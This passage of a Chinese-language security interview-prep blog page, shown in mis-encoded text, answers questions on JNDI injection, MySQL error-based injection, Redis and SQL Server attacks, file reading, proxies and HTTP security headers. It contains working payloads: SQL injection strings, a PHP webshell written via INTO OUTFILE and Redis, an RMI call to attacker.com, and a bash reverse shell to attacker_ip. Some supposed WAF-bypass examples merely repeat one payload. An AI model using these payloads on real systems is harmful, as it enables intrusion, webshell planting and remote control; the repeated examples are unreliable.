é€’ã€‚</li></ol><h4 id="RMIæ¼æ´"><a href="#RMIæ¼æ´" class="headerlink" title="RMIæ¼æ´"></a><strong>RMIæ¼æ´</strong></h4><ol><li><strong>æœªæˆæƒè®¿é—®</strong>ï¼šæœªå¯¹è¿œç¨‹æ–¹æ³•è°ƒç”¨è¿›è¡Œèº«ä»½éªŒè¯ã€‚</li><li><strong>ååºåˆ—åŒ–æ¼æ´</strong>ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¶æ„åºåˆ—åŒ–æ•°æ®è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</li><li><strong>é˜²å¾¡æªæ–½</strong>ï¼š<ul><li>ä½¿ç”¨èº«ä»½éªŒè¯æœºåˆ¶ã€‚</li><li>ç¦ç”¨ä¸å¿…è¦çš„RMIæœåŠ¡ã€‚</li><li>ä½¿ç”¨é˜²ç«å¢™é™åˆ¶RMIæœåŠ¡çš„è®¿é—®ã€‚</li></ul></li></ol><h3 id="JdbcRowSetImplå¦‚ä½•è§¦å‘JNDIæ³¨å…¥"><a href="#JdbcRowSetImplå¦‚ä½•è§¦å‘JNDIæ³¨å…¥" class="headerlink" title="JdbcRowSetImplå¦‚ä½•è§¦å‘JNDIæ³¨å…¥"></a>JdbcRowSetImplå¦‚ä½•è§¦å‘JNDIæ³¨å…¥</h3><p><code>JdbcRowSetImpl</code>é€šè¿‡<code>setDataSourceName</code>æ–¹æ³•è®¾ç½®æ•°æ®æºåç§°ï¼Œå¦‚æœæ•°æ®æºåç§°åŒ…å«JNDIå¼•ç”¨ï¼Œåˆ™ä¼šè§¦å‘JNDIæ³¨å…¥ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.sql.rowset.JdbcRowSet;</span><br><span class="line"><span class="keyword">import</span> javax.sql.rowset.RowSetProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSet</span> <span class="variable">jrs</span> <span class="operator">=</span> RowSetProvider.newFactory().createJdbcRowSet();</span><br><span class="line">        jrs.setDataSourceName(<span class="string">&quot;rmi://attacker.com:1099/Exploit&quot;</span>);</span><br><span class="line">        jrs.setCommand(<span class="string">&quot;SELECT * FROM users&quot;</span>);</span><br><span class="line">        jrs.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é•¿äº­ç§‘æŠ€"><a href="#é•¿äº­ç§‘æŠ€" class="headerlink" title="é•¿äº­ç§‘æŠ€"></a>é•¿äº­ç§‘æŠ€</h2><h3 id="MySQL-æŠ¥é”™æ³¨å…¥å¸¸ç”¨çš„å‡½æ•°"><a href="#MySQL-æŠ¥é”™æ³¨å…¥å¸¸ç”¨çš„å‡½æ•°" class="headerlink" title="MySQL æŠ¥é”™æ³¨å…¥å¸¸ç”¨çš„å‡½æ•°"></a>MySQL æŠ¥é”™æ³¨å…¥å¸¸ç”¨çš„å‡½æ•°</h3><ol><li><p>**floor()**ï¼š</p><ul><li><strong>åŸç†</strong>ï¼šé€šè¿‡ <code>floor(rand(0)*2)</code> çš„é‡å¤æ€§ï¼Œå¯¼è‡´ <code>group by</code> è¯­å¥å‡ºé”™ã€‚</li><li><strong>payload</strong>ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a--</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>**extractvalue()**ï¼š</p><ul><li><strong>åŸç†</strong>ï¼šé€šè¿‡ä¸ç¬¦åˆ XPath è¯­æ³•çš„å­—ç¬¦ä¸²è§¦å‘é”™è¯¯ã€‚</li><li><strong>payload</strong>ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))--</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>**updatexml()**ï¼š</p><ul><li><strong>åŸç†</strong>ï¼šä¸ <code>extractvalue()</code> ç±»ä¼¼ï¼Œé€šè¿‡ä¸ç¬¦åˆ XPath è¯­æ³•çš„å­—ç¬¦ä¸²è§¦å‘é”™è¯¯ã€‚</li><li><strong>payload</strong>ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))--</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="æŠ¥é”™æ³¨å…¥ç»•è¿‡-WAF"><a href="#æŠ¥é”™æ³¨å…¥ç»•è¿‡-WAF" class="headerlink" title="æŠ¥é”™æ³¨å…¥ç»•è¿‡ WAF"></a>æŠ¥é”™æ³¨å…¥ç»•è¿‡ WAF</h3><ol><li><p><strong>ç¼–ç æ··æ·†</strong>ï¼š</p><ul><li>ä½¿ç”¨ URL ç¼–ç æˆ– Unicode ç¼–ç ç»•è¿‡ WAF æ£€æµ‹ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))--</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>æ‹†åˆ†æŸ¥è¯¢</strong>ï¼š</p><ul><li>å°† SQL æŸ¥è¯¢æ‹†åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ³¨å…¥ï¼Œæœ€åç»„åˆæˆå®Œæ•´çš„æŸ¥è¯¢ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))--</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>åè®®ç‰¹æ€§</strong>ï¼š</p><ul><li>åˆ©ç”¨ HTTP å¤´æˆ– Cookie å‚æ•°æ³¨å…¥ SQL ä»£ç ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))--</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="MySQL-å†™æ–‡ä»¶çš„å‡½æ•°"><a href="#MySQL-å†™æ–‡ä»¶çš„å‡½æ•°" class="headerlink" title="MySQL å†™æ–‡ä»¶çš„å‡½æ•°"></a>MySQL å†™æ–‡ä»¶çš„å‡½æ•°</h3><ol><li><p><strong>INTO OUTFILE</strong>ï¼š</p><ul><li>ç”¨äºå°†æŸ¥è¯¢ç»“æœå†™å…¥æ–‡ä»¶ã€‚</li><li><strong>é™åˆ¶</strong>ï¼š<ul><li>éœ€è¦ <code>FILE</code> æƒé™ã€‚</li><li>æ–‡ä»¶å¿…é¡»ä½äº MySQL æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¸Šã€‚</li><li>æ–‡ä»¶è·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„ã€‚</li><li>æ–‡ä»¶ä¸èƒ½å·²å­˜åœ¨ã€‚</li></ul></li><li>ç¤ºä¾‹ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/file.txt&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>LOAD DATA INFILE</strong>ï¼š</p><ul><li>ç”¨äºä»æ–‡ä»¶ä¸­åŠ è½½æ•°æ®åˆ°è¡¨ä¸­ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD DATA INFILE <span class="string">&#x27;/var/www/html/file.txt&#x27;</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> <span class="keyword">table</span>;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="MySQL-ææƒ"><a href="#MySQL-ææƒ" class="headerlink" title="MySQL ææƒ"></a>MySQL ææƒ</h3><ol><li><p><strong>é€šè¿‡å†™æ–‡ä»¶ææƒ</strong>ï¼š</p><ul><li>ä½¿ç”¨ <code>INTO OUTFILE</code> æˆ– <code>LOAD DATA INFILE</code> å†™å…¥ Webshellã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>åˆ©ç”¨ MySQL ç”¨æˆ·æƒé™</strong>ï¼š</p><ul><li>å¦‚æœ MySQL ç”¨æˆ·æœ‰ <code>FILE</code> æƒé™ï¼Œå¯ä»¥å†™å…¥æ–‡ä»¶åˆ° Web ç›®å½•ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="SQL-Server-é™¤äº†-SQL-æ³¨å…¥å¤–çš„æ¸—é€æ–¹å¼"><a href="#SQL-Server-é™¤äº†-SQL-æ³¨å…¥å¤–çš„æ¸—é€æ–¹å¼" class="headerlink" title="SQL Server é™¤äº† SQL æ³¨å…¥å¤–çš„æ¸—é€æ–¹å¼"></a>SQL Server é™¤äº† SQL æ³¨å…¥å¤–çš„æ¸—é€æ–¹å¼</h3><ol><li><p><strong>å­˜å‚¨è¿‡ç¨‹</strong>ï¼š</p><ul><li>åˆ©ç”¨å­˜å‚¨è¿‡ç¨‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;dir C:\&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>æƒé™æ»¥ç”¨</strong>ï¼š</p><ul><li>åˆ©ç”¨é«˜æƒé™ç”¨æˆ·æ‰§è¡Œæ¶æ„æ“ä½œã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_addlogin <span class="string">&#x27;newuser&#x27;</span>, <span class="string">&#x27;password&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>ä¸­é—´ä»¶æ¼æ´</strong>ï¼š</p><ul><li>åˆ©ç”¨ä¸­é—´ä»¶å¦‚ PHPã€Java çš„æ¼æ´è¿›è¡Œæ¸—é€ã€‚</li></ul></li></ol><h3 id="Redis-ä¸»ä»å¤åˆ¶æ¼æ´"><a href="#Redis-ä¸»ä»å¤åˆ¶æ¼æ´" class="headerlink" title="Redis ä¸»ä»å¤åˆ¶æ¼æ´"></a>Redis ä¸»ä»å¤åˆ¶æ¼æ´</h3><ol><li><p><strong>ä¸»ä»å¤åˆ¶</strong>ï¼š</p><ul><li>æ”»å‡»è€…å¯ä»¥é…ç½®ä¸€ä¸ª Redis ä»èŠ‚ç‚¹ï¼Œè¿æ¥åˆ°ç›®æ ‡ Redis æœåŠ¡å™¨ï¼Œè·å–æ•°æ®ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h target_host -p 6379 slaveof attacker_host 6379</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>RCE</strong>ï¼š</p><ul><li>é€šè¿‡ Redis é…ç½®æ–‡ä»¶å†™å…¥æ¶æ„å†…å®¹ï¼Œè§¦å‘ RCEã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h target_host -p 6379 CONFIG SET <span class="built_in">dir</span> /var/www/html</span><br><span class="line">redis-cli -h target_host -p 6379 CONFIG SET dbfilename shell.php</span><br><span class="line">redis-cli -h target_host -p 6379 SET shell.php <span class="string">&quot;&lt;?php system(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="Redis-æœªæˆæƒè®¿é—®å¦‚ä½•è·å¾—æœåŠ¡å™¨æƒé™"><a href="#Redis-æœªæˆæƒè®¿é—®å¦‚ä½•è·å¾—æœåŠ¡å™¨æƒé™" class="headerlink" title="Redis æœªæˆæƒè®¿é—®å¦‚ä½•è·å¾—æœåŠ¡å™¨æƒé™"></a>Redis æœªæˆæƒè®¿é—®å¦‚ä½•è·å¾—æœåŠ¡å™¨æƒé™</h3><ol><li><p><strong>å†™å…¥ Webshell</strong>ï¼š</p><ul><li>é€šè¿‡ Redis å†™å…¥ Webshell åˆ° Web ç›®å½•ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h target_host -p 6379 CONFIG SET <span class="built_in">dir</span> /var/www/html</span><br><span class="line">redis-cli -h target_host -p 6379 CONFIG SET dbfilename shell.php</span><br><span class="line">redis-cli -h target_host -p 6379 SET shell.php <span class="string">&quot;&lt;?php system(<span class="variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>åå¼¹ shell</strong>ï¼š</p><ul><li>åˆ©ç”¨ Redis å†™å…¥åå¼¹ shell çš„è„šæœ¬ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h target_host -p 6379 SET shell.php <span class="string">&quot;&lt;?php exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/attacker_ip/attacker_port 0&gt;&amp;1\&quot;&#x27;); ?&gt;&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸€èˆ¬è¯»å–ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶"><a href="#ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸€èˆ¬è¯»å–ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸€èˆ¬è¯»å–ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶"></a>ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸€èˆ¬è¯»å–ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶</h3><ol><li><p><strong>æ•æ„Ÿé…ç½®æ–‡ä»¶</strong>ï¼š</p><ul><li><code>/etc/passwd</code>ã€<code>/etc/shadow</code>ã€<code>/etc/hosts</code>ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>Web é…ç½®æ–‡ä»¶</strong>ï¼š</p><ul><li><code>/etc/nginx/nginx.conf</code>ã€<code>/etc/apache2/apache2.conf</code>ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>åº”ç”¨é…ç½®æ–‡ä»¶</strong>ï¼š</p><ul><li><code>web.config</code>ã€<code>application.properties</code>ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/html/web.config</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="å¦‚ä½•é€šè¿‡æ–‡ä»¶è¯»å–è·å–åˆ°-Web-çš„ç»å¯¹è·¯å¾„"><a href="#å¦‚ä½•é€šè¿‡æ–‡ä»¶è¯»å–è·å–åˆ°-Web-çš„ç»å¯¹è·¯å¾„" class="headerlink" title="å¦‚ä½•é€šè¿‡æ–‡ä»¶è¯»å–è·å–åˆ° Web çš„ç»å¯¹è·¯å¾„"></a>å¦‚ä½•é€šè¿‡æ–‡ä»¶è¯»å–è·å–åˆ° Web çš„ç»å¯¹è·¯å¾„</h3><ol><li><p><strong>è¯»å– Web é…ç½®æ–‡ä»¶</strong>ï¼š</p><ul><li>é€šè¿‡è¯»å– <code>/etc/nginx/nginx.conf</code> æˆ– <code>/etc/apache2/apache2.conf</code> è·å– Web æ ¹ç›®å½•ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/nginx/nginx.conf | grep root</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>è¯»å– Web åº”ç”¨æ–‡ä»¶</strong>ï¼š</p><ul><li>é€šè¿‡è¯»å– Web åº”ç”¨çš„é…ç½®æ–‡ä»¶è·å–ç»å¯¹è·¯å¾„ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/html/web.config | grep path</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="etc-passwd-æ–‡ä»¶å†…å®¹"><a href="#etc-passwd-æ–‡ä»¶å†…å®¹" class="headerlink" title="&#x2F;etc&#x2F;passwd æ–‡ä»¶å†…å®¹"></a>&#x2F;etc&#x2F;passwd æ–‡ä»¶å†…å®¹</h3><p><code>/etc/passwd</code> æ–‡ä»¶åŒ…å«ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œæ¯ä¸ªç”¨æˆ·å ä¸€è¡Œï¼Œå­—æ®µä¹‹é—´ç”¨å†’å·åˆ†éš”ã€‚æ–‡ä»¶æ ¼å¼å¦‚ä¸‹ï¼š</p><ul><li><strong>ç”¨æˆ·å</strong>ï¼šç”¨æˆ·çš„ç™»å½•åã€‚</li><li><strong>å¯†ç </strong>ï¼šæ—©æœŸç³»ç»Ÿä¸­å­˜æ”¾åŠ å¯†åçš„å¯†ç ï¼Œç°ä»£ç³»ç»Ÿä¸­é€šå¸¸ä¸º <code>x</code>ï¼Œè¡¨ç¤ºå¯†ç å­˜æ”¾åœ¨ <code>/etc/shadow</code> ä¸­ã€‚</li><li>**ç”¨æˆ· ID (UID)**ï¼šç”¨æˆ·çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚</li><li>**ç»„ ID (GID)**ï¼šç”¨æˆ·æ‰€å±ç»„çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚</li><li><strong>ç”¨æˆ·æè¿°</strong>ï¼šç”¨æˆ·çš„çœŸå®å§“åæˆ–æè¿°ä¿¡æ¯ã€‚</li><li><strong>ä¸»ç›®å½•</strong>ï¼šç”¨æˆ·çš„ç™»å½•ç›®å½•ã€‚</li><li><strong>ç™»å½• shell</strong>ï¼šç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨çš„ shellã€‚</li></ul><h4 id="ç¤ºä¾‹ï¼š"><a href="#ç¤ºä¾‹ï¼š" class="headerlink" title="ç¤ºä¾‹ï¼š"></a>ç¤ºä¾‹ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><h3 id="æ­£å‘ä»£ç†å’Œåå‘ä»£ç†çš„åŒºåˆ«"><a href="#æ­£å‘ä»£ç†å’Œåå‘ä»£ç†çš„åŒºåˆ«" class="headerlink" title="æ­£å‘ä»£ç†å’Œåå‘ä»£ç†çš„åŒºåˆ«"></a>æ­£å‘ä»£ç†å’Œåå‘ä»£ç†çš„åŒºåˆ«</h3><ol><li><p><strong>æ­£å‘ä»£ç†</strong>ï¼š</p><ul><li><strong>å®šä¹‰</strong>ï¼šæ­£å‘ä»£ç†æ˜¯ä¸€ä¸ªä½äºå®¢æˆ·ç«¯å’Œç›®æ ‡æœåŠ¡å™¨ä¹‹é—´çš„ä¸­é—´æœåŠ¡å™¨ï¼Œç”¨äºä»£ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚</li><li><strong>å·¥ä½œæ–¹å¼</strong>ï¼šå®¢æˆ·ç«¯é…ç½®ä»£ç†æœåŠ¡å™¨åœ°å€ï¼Œä»£ç†æœåŠ¡å™¨å‘ç›®æ ‡æœåŠ¡å™¨è½¬å‘è¯·æ±‚å¹¶è¿”å›å“åº”ã€‚</li><li><strong>åº”ç”¨åœºæ™¯</strong>ï¼šç”¨äºéšè—å®¢æˆ·ç«¯çœŸå® IPï¼Œè®¿é—®å—é™èµ„æºï¼Œæˆ–è¿›è¡Œè¯·æ±‚è¿‡æ»¤ã€‚</li></ul></li><li><p><strong>åå‘ä»£ç†</strong>ï¼š</p><ul><li><strong>å®šä¹‰</strong>ï¼šåå‘ä»£ç†æ˜¯ä¸€ä¸ªä½äºæœåŠ¡å™¨ç«¯çš„ä¸­é—´æœåŠ¡å™¨ï¼Œç”¨äºä»£ç†æœåŠ¡å™¨çš„å“åº”ã€‚</li><li><strong>å·¥ä½œæ–¹å¼</strong>ï¼šå®¢æˆ·ç«¯ç›´æ¥è®¿é—®ä»£ç†æœåŠ¡å™¨ï¼Œä»£ç†æœåŠ¡å™¨å‘åç«¯æœåŠ¡å™¨è½¬å‘è¯·æ±‚å¹¶è¿”å›å“åº”ã€‚</li><li><strong>åº”ç”¨åœºæ™¯</strong>ï¼šç”¨äºè´Ÿè½½å‡è¡¡ã€ç¼“å­˜ã€SSL ç»ˆæ­¢ã€éšè—åç«¯æœåŠ¡å™¨çœŸå® IP ç­‰ã€‚</li></ul></li></ol><h3 id="Python-æ˜¯å¦æ˜¯çœŸæ­£çš„å¤šçº¿ç¨‹"><a href="#Python-æ˜¯å¦æ˜¯çœŸæ­£çš„å¤šçº¿ç¨‹" class="headerlink" title="Python æ˜¯å¦æ˜¯çœŸæ­£çš„å¤šçº¿ç¨‹"></a>Python æ˜¯å¦æ˜¯çœŸæ­£çš„å¤šçº¿ç¨‹</h3><p>Python çš„å¤šçº¿ç¨‹ç”±äºå…¨å±€è§£é‡Šå™¨é”ï¼ˆGILï¼‰çš„å­˜åœ¨ï¼Œå¹¶ä¸æ˜¯çœŸæ­£çš„å¤šçº¿ç¨‹ã€‚GIL æœºåˆ¶ç¡®ä¿åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è§£é‡Šå™¨ä¸­æ‰§è¡Œï¼Œå› æ­¤åœ¨ CPU å¯†é›†å‹ä»»åŠ¡ä¸­ï¼ŒPython çš„å¤šçº¿ç¨‹å¹¶ä¸èƒ½å……åˆ†åˆ©ç”¨å¤šæ ¸ CPUã€‚</p><h4 id="ç¤ºä¾‹ä»£ç ï¼š-5"><a href="#ç¤ºä¾‹ä»£ç ï¼š-5" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_bound_task</span>():</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">        <span class="built_in">sum</span> += i</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Sum: <span class="subst">&#123;<span class="built_in">sum</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    t = threading.Thread(target=cpu_bound_task)</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><h3 id="å’Œä¿¡æ¯å®‰å…¨ç›¸å…³çš„-HTTP-å“åº”å¤´"><a href="#å’Œä¿¡æ¯å®‰å…¨ç›¸å…³çš„-HTTP-å“åº”å¤´" class="headerlink" title="å’Œä¿¡æ¯å®‰å…¨ç›¸å…³çš„ HTTP å“åº”å¤´"></a>å’Œä¿¡æ¯å®‰å…¨ç›¸å…³çš„ HTTP å“åº”å¤´</h3><ol><li><p><strong>Strict-Transport-Security</strong>ï¼š</p><ul><li>å¼ºåˆ¶æµè§ˆå™¨ä½¿ç”¨ HTTPS è®¿é—®ç½‘ç«™ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Strict-Transport-Security</span><span class="punctuation">: </span>max-age=31536000; includeSubDomains</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>X-Frame-Options</strong>ï¼š</p><ul><li>é˜²æ­¢ç‚¹å‡»åŠ«æŒã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>X-XSS-Protection</strong>ï¼š</p><ul><li>å¯ç”¨æˆ–ç¦ç”¨ XSS ä¿æŠ¤ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1; mode=block</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>X-Content-Type-Options</strong>ï¼š</p><ul><li>ç¦ç”¨ MIME ç±»å‹å—…æ¢ã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Content-Type-Options</span><span class="punctuation">: </span>nosniff</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>Content-Security-Policy</strong>ï¼š</p><ul><li>å®šä¹‰é¡µé¢å¯ä»¥åŠ è½½å“ªäº›èµ„æºã€‚</li><li>ç¤ºä¾‹ï¼š<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="WebLogic-ååºåˆ—åŒ–åŸç†"><a 